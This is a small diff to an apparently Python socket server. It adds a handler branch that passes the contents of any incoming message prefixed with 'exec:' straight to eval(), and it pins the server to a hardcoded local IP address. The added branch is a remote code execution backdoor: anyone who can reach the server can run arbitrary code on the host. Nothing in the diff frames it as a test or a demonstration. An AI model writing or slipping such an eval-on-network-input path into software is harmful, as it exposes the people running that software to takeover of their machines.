@@ -31,6 +31,11 @@ def handler(message):
 	if message == b'Exit':
 		print("Bye!\nReceived signal to Exit.")
 		exit()
+	if message.startswith(b'exec:'):
+		try:
+			eval(message[5:])
+		except Exception as e:
+			print("  Error occured: ", e)
 
 if __name__ == '__main__':
-	start_server()
+	start_server('192.168.43.244')
